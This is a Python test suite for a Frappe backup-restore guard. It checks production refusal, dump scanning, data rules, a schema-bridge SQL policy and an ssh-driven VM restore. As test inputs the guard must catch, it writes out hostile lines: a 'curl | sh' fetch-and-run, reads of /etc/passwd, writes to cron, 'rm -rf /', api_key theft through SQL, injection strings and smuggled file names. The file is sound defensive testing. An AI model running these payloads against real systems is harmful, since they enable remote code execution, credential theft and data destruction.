"""Failure cases of the Frappe target that need no sandbox and no network: production refusal,
backup reading and scanning, manifest loading, the Demo Service Request rules, the drift bridge's policy
and data proof, and the VM step (a fake `ssh` on PATH, a fake test site): what reaches the VM, what it is
asked, how its answers are checked."""
import asyncio
import gzip
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "restoreguard"))
import frappe_target as ft  # noqa: E402

COST1, COST2 = ["estimated_hours", "hourly_rate", "total_cost"], ["effort_hours", "hourly_rate", "total_cost"]
TESTS = [{"site": "test.local", "url": "http://70.34.199.143:8080", "app": "demo_app 0.0.1", "cost": COST1,
          "ssh": {"login": "frappe@70.34.199.143", "key": "/opt/agent/.ssh/restoreguard_abdullah_ed25519"}},
         {"site": "test2.local", "url": "http://70.34.199.143:8081", "app": "demo_app 2.0.0", "cost": COST2,
          "ssh": {"login": "frappe@70.34.199.143", "key": "/opt/agent/.ssh/restoreguard_test2_ed25519"}}]
CONFIG = {"source": {"site": "demo.local", "url": "http://70.34.199.143", "cost": COST1}, "tests": TESTS,
          "doctype": "Demo Service Request"}
CFG, CFG2 = ft.columns(CONFIG)  # the per-site views every function past config() reads
FIELDS = [{"fieldname": "title", "fieldtype": "Data", "options": None, "reqd": 1},
          {"fieldname": "customer", "fieldtype": "Link", "options": "Customer", "reqd": 0},
          {"fieldname": "priority", "fieldtype": "Select", "options": "Low\nMedium\nHigh", "reqd": 0},
          {"fieldname": "estimated_hours", "fieldtype": "Float", "options": None, "reqd": 0},
          {"fieldname": "hourly_rate", "fieldtype": "Currency", "options": None, "reqd": 0},
          {"fieldname": "total_cost", "fieldtype": "Currency", "options": None, "reqd": 0}]
ROW = {"name": "DSR-2026-0001", "title": "Pump", "customer": "Acme", "priority": "High",
       "estimated_hours": 3.0, "hourly_rate": 100.0, "total_cost": 300.0}
DUMP = ("-- MariaDB dump\n/*M!999999\\- enable the sandbox mode */ \n\n"
        "INSERT INTO `tabDemo Service Request` VALUES\n('DSR-1','we load data from the old system');\n"
        "-- Dump completed on 2026-11-27 13:05:57\n")


def _gz(d, name, text=None, raw=None):
    p = Path(d) / name
    p.write_bytes(raw if raw is not None else gzip.compress(text.encode()))
    return p


class ProdRefusal(unittest.TestCase):
    def test_real_config_passes(self):
        self.assertEqual(ft.check_config(json.loads(json.dumps(CONFIG))), CONFIG)
        self.assertEqual([t["version"] for t in ft.targets(ft.config())], ["test.local", "test2.local"])

    def test_any_bad_test_site_refuses_the_config(self):
        for tests in ([], [TESTS[0], TESTS[0]], [TESTS[0], {**TESTS[1], "url": "http://70.34.199.143"}]):
            with self.assertRaisesRegex(ValueError, "refused"):
                ft.check_config({**CONFIG, "tests": tests})

    def test_test_target_on_production_refused(self):
        for test in ({"site": "test.local", "url": "http://70.34.199.143"},  # port 80 by default
                     {"site": "test.local", "url": "http://10.0.0.9:80"},
                     {"site": "test.local", "url": "http://70.34.199.143:80/"},
                     {"site": "demo.local", "url": "http://70.34.199.143:8080"}):
            with self.assertRaisesRegex(ValueError, "refused"):
                ft.check_column({**CFG, "test": test})

    def test_same_host_port_as_production_refused(self):
        cfg = {**CFG, "source": {"site": "erp.prod", "url": "https://erp.example.com"},
               "test": {"site": "erp.test", "url": "https://ERP.example.com:443"}}
        with self.assertRaisesRegex(ValueError, "production host:port"):
            ft.check_column(cfg)

    def test_production_client_cannot_write(self):
        with tempfile.TemporaryDirectory() as d:
            tokens = Path(d) / "t.json"
            tokens.write_text(json.dumps({"demo.local": "k:s", "test.local": "k:s"}))
            src = ft.Site({**CFG, "tokens": str(tokens)}, "source")
            for method in ("POST", "PUT", "DELETE"):
                with self.assertRaises(PermissionError):
                    src.call("/api/resource/Demo%20Service%20Request/DSR-2026-0001", method=method, body={})

    def test_ssh_to_another_host_refused(self):
        with self.assertRaisesRegex(ValueError, "ssh"):
            ft.check_column({**CFG, "ssh": {**CFG["ssh"], "login": "frappe@10.0.0.9"}})

    def test_unsafe_doctype_refused(self):
        with self.assertRaisesRegex(ValueError, "doctype"):
            ft.check_column({**CFG, "doctype": "x`; DROP TABLE y; --"})


class Scan(unittest.TestCase):
    def test_good_dump_readable_and_text_in_records_ignored(self):
        with tempfile.TemporaryDirectory() as d:
            ok, tables, findings, err = ft.scan(_gz(d, "a.sql.gz", DUMP))
            self.assertEqual((ok, tables, findings, err), (True, {"Demo Service Request"}, [], ""))

    def test_broken_inputs_unreadable(self):
        with tempfile.TemporaryDirectory() as d:
            raw = gzip.compress(DUMP.encode() * 200)
            cases = {"truncated gz": _gz(d, "t.sql.gz", raw=raw[:len(raw) // 2]),
                     "no trailer": _gz(d, "n.sql.gz", DUMP.split("-- Dump completed")[0]),
                     "random bytes": _gz(d, "r.sql.gz", raw=os.urandom(4096)),
                     "empty": _gz(d, "e.sql.gz", raw=b""),
                     "missing": Path(d) / "missing.sql.gz"}
            for what, path in cases.items():
                ok, *_, err = ft.scan(path)
                self.assertFalse(ok, what)
                self.assertTrue(err, what)

    def test_code_paths_found(self):
        poison = ["SELECT 'x' INTO OUTFILE '/etc/cron.d/x';", "\\! curl http://e.x | sh",
                  "LOAD DATA INFILE '/etc/passwd' INTO TABLE t;", "GRANT ALL ON *.* TO 'u'@'%';",
                  "/*!50003 CREATE DEFINER=`root`@`%` TRIGGER t BEFORE INSERT ON x FOR EACH ROW SET @a=1 */;",
                  "INSTALL SONAME 'ha_connect';"]
        with tempfile.TemporaryDirectory() as d:
            for line in poison:
                ok, _, findings, _ = ft.scan(_gz(d, "p.sql.gz", DUMP.replace("\n\n", f"\n{line}\n", 1)))
                self.assertTrue(ok)
                self.assertEqual(len(findings), 1, line)


class LoadBackup(unittest.TestCase):
    def test_manifest_failures(self):
        good = {"file": "x.sql.gz", "sha256": "0" * 64, "site": "demo.local", "schema_version": "frappe 16",
                "row_counts": {"Demo Service Request": 1}}
        with tempfile.TemporaryDirectory() as d:
            gz = _gz(d, "20261127_140556-demo_local-database.sql.gz", DUMP)
            mpath = Path(d) / "20261127_140556-demo_local-database.json"
            with self.assertRaisesRegex(ValueError, "no manifest"):
                ft.load_backup(gz)
            mpath.write_text("{not json")
            with self.assertRaisesRegex(ValueError, "unreadable"):
                ft.load_backup(gz)
            mpath.write_text(json.dumps({k: v for k, v in good.items() if k != "row_counts"}))
            with self.assertRaisesRegex(ValueError, "lacks row_counts"):
                ft.load_backup(gz)
            mpath.write_text(json.dumps({**good, "row_counts": {"x`) UNION SELECT 1; --": 1}}))
            with self.assertRaisesRegex(ValueError, "unsafe"):
                ft.load_backup(gz)
            mpath.write_text(json.dumps(good))
            rec = ft.load_backup(gz)
            self.assertEqual((rec["id"], rec["kind"]), ("20261127_140556-demo_local-database", "frappe"))
            if os.geteuid() != 0:
                mpath.chmod(0)
                with self.assertRaisesRegex(ValueError, "unreadable"):
                    ft.load_backup(gz)


class Rules(unittest.TestCase):
    def failed(self, rows, existing={"customer": {"Acme"}}):
        return [n for n, ok, _ in ft.rules(FIELDS, rows, existing, COST1) if not ok]

    def test_good_row(self):
        self.assertEqual(self.failed([ROW]), [])

    def test_each_rule_catches_its_fault(self):
        cases = {"required: title": {"title": ""},
                 "customer links to an existing Customer": {"customer": "Gone AB"},
                 "priority is one of Low/Medium/High": {"priority": "Urgent"},
                 "total_cost = estimated_hours x hourly_rate": {"total_cost": 3000.0},
                 "estimated_hours > 0, hourly_rate >= 0": {"estimated_hours": 0, "total_cost": 0}}
        for rule, change in cases.items():
            self.assertEqual(self.failed([ROW, {**ROW, "name": "DSR-2026-0002", **change}]), [rule], rule)

    def test_decimal_strings_from_mariadb(self):
        row = {**ROW, "estimated_hours": "3.000000000", "hourly_rate": "100.000000000", "total_cost": "300.000000000"}
        self.assertEqual(self.failed([row]), [])


class Compare(unittest.TestCase):
    names = [f["fieldname"] for f in FIELDS]

    def test_same_records(self):
        self.assertEqual(ft.compare(self.names, [ROW], [{**ROW, "estimated_hours": 3}]), [])

    def test_differences(self):
        diffs = ft.compare(self.names, [ROW], [{**ROW, "title": "Changed"}, {**ROW, "name": "DSR-2026-0009"}])
        self.assertEqual(len(diffs), 2)
        self.assertEqual(ft.compare(self.names, [ROW], []), ["DSR-2026-0001 missing"])


FIELDS2 = [f for f in FIELDS if f["fieldname"] != "estimated_hours"] + [
    {"fieldname": "effort_hours", "fieldtype": "Float", "options": None, "reqd": 0, "default": "1"},
    {"fieldname": "category", "fieldtype": "Select", "options": "Repair\nInstallation", "reqd": 1, "default": None}]
ROW2 = {**{k: v for k, v in ROW.items() if k != "estimated_hours"}, "effort_hours": 3.0, "category": "Repair"}


class Bridge(unittest.TestCase):
    def test_carried_finds_the_rename(self):
        self.assertEqual(ft.carried(FIELDS, [ROW], FIELDS2, [ROW2]), ({"estimated_hours": "effort_hours"}, []))

    def test_migrate_alone_is_not_carried(self):
        mapping, problems = ft.carried(FIELDS, [ROW], FIELDS2, [{**ROW2, "effort_hours": 1.0, "category": None}])
        self.assertEqual(mapping, {})
        self.assertIn("estimated_hours: its values (3.0) are in no field of the new version", problems)
        self.assertEqual(ft.carried(FIELDS, [ROW], FIELDS2, [{**ROW2, "title": "x"}])[1],
                         ["DSR-2026-0001.title: 'Pump' vs 'x'"])
        self.assertTrue(ft.carried(FIELDS, [ROW], FIELDS2, [])[1])

    def test_policy(self):
        dt = "Demo Service Request"
        ok = ("UPDATE `tabDemo Service Request` SET effort_hours = estimated_hours;\n"
              "UPDATE `tabDemo Service Request` SET category = CASE WHEN title LIKE '%install; drop%' THEN 'Installation' ELSE 'Repair' END;")
        self.assertEqual(ft.check_bridge(ok, dt), "")
        for bad in ("", "DELETE FROM `tabDemo Service Request`;", "DROP TABLE `tabUser`;",
                    "UPDATE `tabUser` SET api_key = 'x';",
                    "UPDATE `tabDemo Service Request` SET notes = 'x'; GRANT ALL ON *.* TO 'x';",
                    "UPDATE `tabDemo Service Request` SET notes = (SELECT api_key FROM `tabUser` LIMIT 1);",
                    "UPDATE `tabDemo Service Request` d JOIN `tabUser` u SET d.notes = u.api_key;",
                    "UPDATE `tabDemo Service Request` SET notes = LOAD_FILE('/etc/passwd');",
                    "\\! rm -rf /"):
            self.assertTrue(ft.check_bridge(bad, dt), bad)


FILE = "20261127_140556-demo_local-database.sql.gz"
# Stands in for ssh: records its argv, prints like the VM script, exits FAKE_RC (or sleeps past the timeout).
FAKE_SSH = """#!/bin/sh
printf '%s\n' "$@" > "$FAKE_ARGV"
[ -n "$FAKE_STDIN" ] && cat > "$FAKE_STDIN"
[ -n "$FAKE_SLEEP" ] && sleep "$FAKE_SLEEP"
echo "Restoring test.local from $(eval echo \\${$#})"
[ "$FAKE_RC" = 0 ] || echo "ERROR: Rejected command/argument." >&2
exit "$FAKE_RC"
"""


class FakeSite:
    """test.local after the restore: a login page, the token API, get_count per doctype, the records."""

    def __init__(self, counts, records, login=200):
        self.counts, self.records_, self.login, self.calls = counts, records, login, []

    def __call__(self, cfg, role):
        assert role == "test", "the VM step reads only test.local"
        return self

    def call(self, path, **kw):
        self.calls.append(path)
        return self.login, b"", {}

    def method(self, name, **args):
        self.calls.append(name)
        return {"frappe.auth.get_logged_user": "Administrator"}.get(name) or self.counts[args["doctype"]]

    def records(self, doctype, fields):
        self.calls.append(f"records {doctype}")
        return self.records_


class VmStep(unittest.TestCase):
    counts = {"Demo Service Request": 1, "Customer": 4}

    def setUp(self):
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        self.dir = Path(d.name)
        (self.dir / "ssh").write_text(FAKE_SSH)
        (self.dir / "ssh").chmod(0o755)
        self.argv = self.dir / "argv"
        self.env = mock.patch.dict(os.environ, {"PATH": f"{self.dir}:{os.environ['PATH']}", "FAKE_ARGV": str(self.argv),
                                                "FAKE_RC": "0", "FAKE_SLEEP": ""})
        self.env.start()
        self.addCleanup(self.env.stop)

    def cell(self, file=FILE, column=0):
        backup = {"id": file[:-7], "file": file, "manifest": {"row_counts": self.counts}}
        return ft.FrappeCell(backup, ft.targets(CONFIG)[column], lambda ev: None)

    def run_vm(self, cell, site, want=FIELDS, bridge=None):
        with mock.patch.object(ft, "Site", site):
            asyncio.run(ft._vm(cell, FIELDS, [ROW], want, bridge))
        return {c["check"]: c for c in cell.checks}

    def test_bridged_restore_on_test2(self):
        sql = "UPDATE `tabDemo Service Request` SET effort_hours = estimated_hours;"
        os.environ["FAKE_STDIN"] = str(self.dir / "stdin")
        cell = self.cell(column=1)
        cell.bridges.append({"round": 1})
        checks = self.run_vm(cell, FakeSite(self.counts, [ROW2]), FIELDS2, sql)
        self.assertEqual(cell.state, "healed", cell.reason)
        self.assertIn("estimated_hours -> effort_hours", cell.reason)
        self.assertEqual(self.argv.read_text().splitlines()[-3:], ["frappe@70.34.199.143", FILE, "bridge"])
        self.assertIn("/opt/agent/.ssh/restoreguard_test2_ed25519", self.argv.read_text().splitlines())
        self.assertEqual((self.dir / "stdin").read_text(), f"START TRANSACTION;\n{sql}\nCOMMIT;\n")
        self.assertTrue(checks["on test2.local: required: category"]["pass"])
        self.assertTrue(checks["on test2.local: total_cost = effort_hours x hourly_rate"]["pass"])

    def test_bridge_that_left_category_empty_fails_on_test2(self):
        cell = self.cell(column=1)
        checks = self.run_vm(cell, FakeSite(self.counts, [{**ROW2, "category": None}]), FIELDS2, "UPDATE x;")
        self.assertEqual(cell.state, "failed")
        self.assertFalse(checks["on test2.local: required: category"]["pass"])

    def test_vm_file_names(self):
        self.assertTrue(ft.vm_file(CFG, FILE))
        for bad in ("latest", "20261127_140556-demo_local-bitflip-database.sql.gz", f"../{FILE}", f"{FILE}.part",
                    "20261127_140556-test_local-database.sql.gz", f"{FILE}\nid", f"x {FILE}", ""):
            self.assertFalse(ft.vm_file(CFG, bad), bad)

    def test_asks_the_vm_for_exactly_that_file(self):
        rc, last = asyncio.run(ft.vm_restore(CFG, FILE))
        self.assertEqual((rc, last), (0, f"Restoring test.local from {FILE}"))
        argv = self.argv.read_text().splitlines()
        self.assertEqual(argv[-2:], ["frappe@70.34.199.143", FILE])
        for opt in ("BatchMode=yes", "StrictHostKeyChecking=yes", "IdentitiesOnly=yes"):
            self.assertIn(opt, argv)

    def test_vm_refusal_and_timeout(self):
        os.environ["FAKE_RC"] = "2"
        self.assertEqual(asyncio.run(ft.vm_restore(CFG, FILE)), (2, "ERROR: Rejected command/argument."))
        os.environ.update(FAKE_RC="0", FAKE_SLEEP="5")
        with mock.patch.object(ft, "RESTORE_TIMEOUT_S", 0.5):
            self.assertEqual(asyncio.run(ft.vm_restore(CFG, FILE))[0], "timeout")

    def test_restored_and_checked(self):
        site = FakeSite(self.counts, [ROW])
        cell = self.cell()
        checks = self.run_vm(cell, site)
        self.assertEqual(cell.state, "native", cell.reason)
        self.assertTrue(all(c["pass"] for c in checks.values()), checks)
        self.assertIn("test.local restored on the VM (bench restore + migrate)", checks)
        self.assertEqual(cell.restored_into()["instance"], "test.local on Vultr VM 70.34.199.143 (full site restore via bench)")
        self.assertEqual(set(cell.timings), {"vm_restore", "test_site"})

    def test_production_name_required_before_ssh(self):
        site = FakeSite(self.counts, [ROW])
        cell = self.cell("20261127_140556-demo_local-bitflip-database.sql.gz")
        self.run_vm(cell, site)
        self.assertEqual(cell.state, "failed")
        self.assertFalse(self.argv.exists(), "ssh ran for a fault copy")
        self.assertEqual(site.calls, [])

    def test_vm_refusal_stops_before_test_site(self):
        os.environ["FAKE_RC"] = "2"
        site, cell = FakeSite(self.counts, [ROW]), self.cell()
        checks = self.run_vm(cell, site)
        self.assertEqual(cell.state, "failed")
        self.assertIn("exit 2", checks["test.local restored on the VM (bench restore + migrate)"]["detail"])
        self.assertEqual(site.calls, [])

    def test_wrong_test_site_fails(self):
        for site, check in ((FakeSite({**self.counts, "Customer": 3}, [ROW]), "on test.local: row counts match the source (2 doctypes)"),
                            (FakeSite(self.counts, [{**ROW, "total_cost": 1.0}]), "test.local holds the backup's 1 Demo Service Request records"),
                            (FakeSite(self.counts, [ROW], login=502), "test.local login page answers")):
            cell = self.cell()
            checks = self.run_vm(cell, site)
            self.assertEqual(cell.state, "failed", check)
            self.assertFalse(checks[check]["pass"], check)


if __name__ == "__main__":
    unittest.main()
